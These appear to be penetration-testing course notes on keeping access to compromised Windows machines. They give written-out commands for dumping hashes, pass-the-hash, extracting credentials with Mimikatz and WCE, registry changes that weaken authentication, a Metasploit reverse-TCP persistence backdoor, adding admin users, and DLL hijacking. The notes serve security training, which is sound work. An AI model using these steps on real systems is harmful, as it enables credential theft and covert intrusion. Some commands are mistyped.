

# Maintaining Access



So far, we focused on how to elevate privileges on a compromised machine. Once we have higher
privileges, we can move onto the next step

the purpose of this phase is to make our presence on the machine persistent - creating a backdoor
readily available for later use

We can use different techniques and tools to achieve this goal. Some are stealthier than others,
and some are only relevant to a particular OS

We will study a few methods to use during this phase, but remember that we can always improve and
tweak them to our needs

The following diagram summarizes the techniques we are going to use 



			Maintaining Access
Password Hash		Backdoor	New Users
									|
									|
Pash the hash						|
crack the hash						|
		|							|
	Services such as RDP, VNC Telnet


some of the techniques (such as RDP or VNC) require services for the connection. Before we start 
exploring them, note that there are different situations that you can face. For example: 

No services are in place: we need to activate them 

For new users, we need to add them for each service (if they are already active, otherwise we have
to activate them)


# Passwords and Hashes

Let us then start with one of the easiest techniques: recovering the password hash


We are assuming that we already have a meterpreter session and SYSTEM level access on the target 
machine (Windows 8.1) 

The easiest way to dump the hashes from the SAM database is by running the command:

 run hashdump

Notice that depending on the OS version, we may be able to gather this info with even lower
privileges such as admin accounts

If we get an access denied error then we can try to migrate to a service process with system privs 
and retry the command 

Also note that if we try running hashdump directly, sometimes we might get the message "priv_passwd
_ get_sam_hashes: operation failed" even with NT AUTHORITY\SYSTEM 

To bypass this error you have two options: 1) execute run hashdump or 2) migrate to a different 
process


Now that we have password hashes, we can move in two different directions. Lets see the first one 


# Pass the Hash 

If we are not able to crack the hashes, we have to use other techniques to ensure access on the
target machine 

Pash the hash is a technique that allows us to connect to a remote machine, by means of the hash
without using the actual plain-text password. This technique can be used to connect back into the
exploited machine, or to exploit other machines that share the same account credentials

Pass the hash is a technique that was discovered and published in 1997 by Paul Ashton that allows 
an attacker to use LM and NTLM hashes to authenticate to a remote host 

As you can imagine, if we are to gather administrator hashes, we can mount a pass the hash attack
on all the machines in the network. This is very dangerous since the same accounts (username and
password_hash) can be used on multiple machines


There are different tools and scripts freely available online that we can use to exploit this
vulnerability. What we are going to use next is a metasploit module called "psexec", this module
when given a username and password (or its hash), is able to execute an arbitrary payload

Let us see how to use password hashes to gain a shell on the remote system


The metasploit module is located at 

use exploit/windows/smb.psexec

Once selected, we will just need to set the password hash (SMBpass) the username (SMBuser), the
remote host IP (RHOST) and then configure the payload options


Notice that we need am admin account for the attack to work

If the attack works, we should be able to obtain a new meterpreter session


Sometimes being in the local admin group is not enough to pass-the-hash, and depending on the
windows OS configuration and version, some changes may be required on the target system in order
for this to work


The issue typically presents itself when trying to pass the hash from an account which isnt an
"actual" administrator (RID-500), but rather, from an account that is in the administrators group

For example, if we try the psexec module from a session where our current user is in the admin
group, but not an "actual" administrator, and we get a STATUS_ACCESS_DENIED error, this is a good 
indication that registry changes may be required on the target host in order for a successful 
pass-the-hash attack on the target


The two registry entries needed on the target for this to be successful are: 

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

Add a new DWORD (32-bit) named LocalAccountTokenFilterPolicy and set its value to 1


HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters

Add a new DWORD (32-bit)named RequireSecuritySignature and set its value to 0


Nonetheless, if we already have a session on the target as an admin, and would like to modify
those registry settings to help us with the attack, we can do so with a couple simple PowerShell
one-liners 


PS C:\> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord


PS C:\> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManserver\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord


The previous registry cahnges, particularly the LocalAccountTokenFilterPolicy setting, essentially
allow non RID-500 user accounts (users in the local admin group for instance) to successfully
pass-the-hash in some cases


# Pass the hash over RDP (xfreerdp)

In addition to the traditional methods of pass the hash techniques, if we find ourselves in a
situation where we have obtained an NTLM hash and would like to use it to log onto a
remotedesktop service without the need to provide actual credentials, we can do that with an RDP
client available for Linux known as xfreerdp, and comes preinstalled on Kali Linux


xfreerdp --help 

Using the "/pth" switch and xfreerdp, we can pass an NTLM hash to a remote desktop server with
the following command 

xfreerdp /u:admin /d:foocorp /pth:hashgoeshere /v:targetIP



# Cracking Hashes 

Once we dump the hashes, we can try to crack them and obtain passwords that are used to login on
active services running on the target

We dont need to cover password cracking in depth here since it is covered in System Security



# Mimikatz

Before seeing how to work with services and users, it is important to know that we may be able to
get plaintext passwords from the exploited machine using Mimikatz

Mimikatz is a tool able to extract plaintext password, Kerberos tickets, perform pass the hash
attacks and much more. Although it is a stand alone tool Netasploit implements an extension that
allows us to use its features directly from a meterpreter session


We will briefly see it here in order to gather credentials and then we will inspect it in detail
later

In order to start using Mimikatz and get the best out of it, it is important to have the current
meterpreter session running on a 64-bit process. This allows it to successfully load all Mimikatz
features without any issues

We can verify this by running sysinfo

Since we are currently on a 32-bit process, we have to migrate to a 64-bit process. Moreover we
need a process with the same privileges of the current session. Since we are currently running on
SYSTEM privileges, we can list them with the following command:

meterpreter > ps -A x86_64 -s


-A sepcifies the architecture 

-s we list only system processes


Now we have to select one of the processes listed and run migrate [PID] as shown below

meterpreter > migrate 448 

After that we will run on a 64-bit process and we will have SYSTEM privileges on the machine


We can then load Mimikatz and start using its feature to gather the plaintext credntials. The
commands are very simple: We first run "load mimikatz" and then we print the help manual to list
the new commands available: 


We can try to retrieve credentials from different services and protocols. Here we will try to
retrieve the credentials with wdigest 

meterpreter > wdigest 

To get the best out of Mimikatz read the tool wiki, there is lots of useful tasks and operations
that can be run to get useful information



# Windows Credentials Editor


Another useful tool we can use in this step is WCE. Since it is a Windows binary, you will have
to upload it on the remote machine and then run it from the meterpreter session

meterpreter > -i -f wce.exe -a -h


We will not dig deeper into this tool here, but it offers many options and commands to work with
windows credentials, logon sessions, Kerberos and so on


# Enable RDP Service

At this time we should have a set of working credentials. What we want to do now is check if the
RDP Service is active on the target, since we want to use it for backdoor access

We already have a session on the remote machine, and we can check enabled services by running the
following command: 

net start

remember we can open a windows command prompt shell from a meterpreter session by running the
shell command

Note, there are many different commands we can use to check if a specific service is enabled or
not. For example we can use the Windows Management Instrumentation Command-line (WMIC) tool as
follows: 

wmic service where 'Caption like "Remote%" and started=true' get Caption


We can also use meterpreter scripts to check services, such as service_manager and enum_services:

run service_manager -l 

run post/windows/gather/enum_services


Now that we know if RDP is enabled or not, let's suppose it is disabled and enable it. Once
again, we can do it directly from a windows shell or via meterpreter scripts. The script
we are going to use is called getgui

getgui -e 

this will enable RDP, but we can also add a new user and password with -u and -p


Enabling RDP on the machine is not all. If the target user (the one we known credentials for) is
not allowed to connect through RDP, we will have to grant him this privilege by adding him to the
redmote desktop users group 

Moreover we have to be sure that the windows firewall does not block the connections


We assume that this group can log in to RDP, in other words that "allow log on through Remote
Desktop Services" Local policy is assigned to the Remote Desktop Users Group. If the box is
hardened this might not be the case


From the windows shell we can issue the command: 

net localgroup "Remote Desktop Users" els_user /add

Where Remote Desktop User is the name of the group we want to add the user to and els_user is the 
username. If the command suceeds, we will get something like this:


C:\Windows\system32>net localgroup "Remote Desktop Users" els_user /add net localgroup "Remote
Desktop Users" els_user /add
The command completed succesfully


We can now check that everything works by trying to connect to the machine via RDP

rdesktop [IP_Address] -u [Username] -p [Pwd]


Note we can use the "net" command to list groups and add users to them. The following command will 
List all groups

net localgroup

This will give output like the following:

*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Remote Desktop Users



If we want to list users within a specific group, we just need to add the name of the group at the 
end of the previous command. For example lets add users in the RDP group

net localgroup "Remote Desktop Users"

Now that we have the groups list, we could add the user to one of them. For example, we can grant 
Standard users with administrator privileges, by simply adding them in the Administrators group


Note that you can do the previous steps for all the groups listed before

For example, if you want a remote shell on the system, instead of RDP, you can make sure that Telnet 
service is enabled, and that your user is in the TelnetClients group. This way you can connect back
again through Telnet with the same username and password


# Backdoors 

Lets now focus on how to create and install a backdoor into the exploited machine

Our goal is to use Metaslpoit to generate an executable file (backdoor) that will persist through
reboots of the victim machine

Note that we are going to use connect-back backdoors, which means that it will be the victim machine 
that initiates the connection. This way, we will avoid issues with dynamic IP addresses or firewalls
in the middle


The disadvantage is that the backdoor will always try a connection to the same IP address and port 
unless you use a service like: 

# http://freedns.afraid.org
# http://www.zoneedit.com/dynamicDNS.html
# http://xname.org

Note, this is the same technique that most malware uses and ensures that you can change the binding 
on the DNS management panel to point to your IP address


The exploitation process works in this way:

1. Upload the backdoor to the victim 

2. Execute the file. At prefixed times (ie, 5-6-10 seconds), it will try to connect back to our
listener 

3. Run it automatically at boot. Depending on the OS, this can be done by editing the Windows 
registry, services, schedules, rc.local, init.d


Thanks to Metasploit, the entire process can be completely automated. We do not have to worry 
about scripting the file, uploading it or editing the registers and services 

What we have to do once we have the meterpreter session, is run one of the scripts we will see in
in a minute and then, each time we want to connect back, start a listener on our machine

Notice that the script only works against Windows machines


Before running the scripts lets see what options is offers

meterpreter > run persistence -h 

This command will show options to customize the script and choose where to upload the file, which 
payload to use, the interval between each connection attempt, how to start the backdoor and so on 


Lets see which options we will use in order to configure it correctly:

-A starts the handler on our machine
-X start the agent at boot (note, this requires system privs on the target)
-i 5 connection attempts every 5 seconds
-p 8080 the port for the connect back 
-r [IP_address] our IP


Once we run it, the script automatically creates a backdoor, uploads it and sets the registry keys
to start at boot


The steps in detail are as follows

1. Creating the paylod: 
Creating Payload=windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=8080

2. Uploading the backdoor file:
persistent script written to C:\Windows\TEMP\flKiuvjydy.vbs

3. Executing the backdoor:
Executing script C:\Windows\Temp\flKiuvjydy.vbs

4. Add the entry in the Windows Registry:
Installing into autorun as
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\nZVDeQbFvEi


Lets double check that te changes are real. Lets first get the registry value with the "reg" command 
and then list the files in the path where the backdoor has been uploaded

meterpreter> reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v nZVDeQbFvEi

output will show: 
Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Name: nZVDeQbFvEi
Type: REG_SZ
Data: C:\Windows\TEMP\flKiuvjydy.vbs

//this should show our payload file
meterpreter > ls c:\\Windows\\TEMP\\fl*


Once the process is complete, if we want to get a session on the target machine, we have to start
the listener and wait for incoming connections. We can do it by using the /multi/handler module

Notice that we have to set the same options set with persistence: same payload, IP address and 
local port


In this way, each time you need a meterpreter session on the target machine, you only need to start
the handler and wait for the victim to connect back

Since we edited the Windows Registry to start the script at the system boot, we will be able to 
create the session each time the machine is booted

# Manual Installation 

Suppose we crafted our own backdoor with msfvenom  or any other tool such as Veil or BDF. Here are
the command to upload, and edit the registry Keys on your target machine with meterpreter: 


1. Upload the file to the victim machine: 

upload [path_to_backdoor_file] [path_on_target]

//the above command should look like something like this
upload /root/my_bd.exe c:\\Windows\


2. Edit the Windows Registry Key with the "reg" command, in order to load your file at startup:

reg setval -k [registry_key_path] -d [value_of_the_key] -v [name_of_the_key]

in our case, it would be as follows: 

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\mybd.exe" -v be_name



# New Users

Now that we know how to upload a backdoor, the last technique left to see is the creation of a new 
user

An easy way to do this is by running the "net user" and "net localgroup" commands: 

C:\Windows\system32>net user EveUser EvePass /add

C:\Windows\system32>net localgroup "Administrators" EveUser /add


the above commands will create a new user and add it to the administrators group 


Once you create a new user for yourself, you have to join groups that allow you access to services
such as RDP or Telnet and so on

we have already went over this so we will skip these steps here



# DLL Hijacking / Preloading

Another method we can use for maintaining access in many cases, but also for privesc in others, 
is known as DLL Hijacking, DLL Preloading or Insecure Library Loading


DLL Hijacking allows us the ability to abuse a built-in behavior in the way that executables, when 
launched, search for Dynamic Link Libraries (DLL's) to import

This behavior is known as the DLL search order

When a program is launched, the DLL Search Order in most cases is as follows: 

1. The directory from which the application was launched 

2. The C:\Windows\System32 directory 

3. The 16-bit Windows system directory (i.e, C:\windows\system)

4. The Windows directory (C:\windows)

5. The current directory at the time of execution 

6. Any directories specified by the %PATH% environment variable


As an example to help clarify, lets briefly revisit a recent case of DLL Hijacking in Microsoft's 
popular telecom software, Skype, which when exploited, resulted in a low-privileged user obtaining 
SYSTEM-level privileges


Skype uses a proprietary update mechanism in order to deliver updates to the software, which runs
when first installed, and then also runs periodically to check for updates

When it does so, it launches a second binary (Updater.exe) from within the "%ProgramFiles%\Skype\Updater" directory, which is launched as SYSTEM


This "Updater.exe" component, when it finds an update for Skype, would copy or extract a new version 
of the binary to the "%systemroot%\Temp" directory as a file named "SKY<abcd>.tmp" which when the 
Updater.exe component would then launch as a seperate process


It was then found that the newly created %systemroot%\Temp\SKY<abcd>.tmp executable, when launched 
by the updater.exe component, would also look for a DLL in the same Temp directory called
"UXTheme.dll", and attempt to import it

Since an attacker could write to the "%systemroot%\Temp" directory, it was trivial to replace the 
UXTheme.dll with a malicious copy and take control of the target as SYSTEM



Another example of this, where an application executes another process in order to fetch updates and
results in DLL Hijacking, was the popular Slack messaging platform

Although this particular example didnt result in privilege escalation, rather it resulted in
obtaining a reverse shell as the current user, and also offered a method of persistence every time
the user would launch the "Check for Updates" command from within the slack client or when the user
would simply launch the slack client

When launching the Slack executable on Windows, it would search for a DLL called "DNSAPI.dll" from 
within the "%localappdata%\slack" directory, it was trivial to replace the DNSAPI.dll with our own
malicious copy

Our malicious DLL would then be executed whenever the user clicked on the "Check for updates" option
or when the application itself checked for updates periodically, and results in a meterpreter session

We can read more about this vulerability here

# https://www.obscurechannel.com/x42/slack.html 



These are just a couple examples of "hundreds" of applications that are vulnerable to DLL Hijacking


Finding these instances of vulnerable applications can be done through either manual methods or
using scripts that can help us find these vulerable applications and DLL's


One tool we will cover in labs and videos in this module, is the Process Monitor utility from the
SysInternals Suite. Using Process Monitor, we can easily identify such applications, and DLL's we
can use for this class of vulnerability 


The process for manually identifying typical DLL Hijacking oppportunities using Process Monitor
(procmon) can be summarized as follows

1. Create a procmon filter for a specific executable we'd like to investigate, (in this case
"RegSrvc.exe"), and also, create a filter for "NAME NOT FOUND" for the result column so we can 
quickly filter on relevant entries 

2. Identify cases where the application is looking for a DLL in a directory which we can write to,
or modify 

3. Drop our modified payload in the writeable directory 

4. Restart the service, re-launch the application, or wait for the system to be rebooted in the case
the executable is in fact associated with a service that starts at boot time, or, alternatively,
wait for the user to launch the affected application 

(Videos and labs following this section will show these tecniques in action)

